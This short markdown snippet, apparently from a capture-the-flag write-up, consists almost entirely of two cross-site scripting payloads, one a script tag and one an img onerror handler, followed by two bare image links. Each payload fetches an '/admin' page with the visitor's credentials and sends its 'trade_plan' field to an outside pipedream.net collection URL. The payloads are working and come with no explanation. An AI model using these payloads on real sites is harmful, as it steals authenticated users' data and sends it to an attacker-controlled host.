```
<script>
  fetch('/admin')
    .then(response => response.json())
    .then(data => {
      new Image().src = "https://eo3acfy7jjf8uik.m.pipedream.net/?flag=" + encodeURIComponent(data.trade_plan);
    });
</script>
```
```
<img src=x onerror="fetch('/admin', { credentials: 'include' }).then(res => res.json()).then(data => { new Image().src = 'https://eo3acfy7jjf8uik.m.pipedream.net/?flag=' + encodeURIComponent(data.trade_plan); })">
```
![alt text](image-1.png)

![alt text](image.png)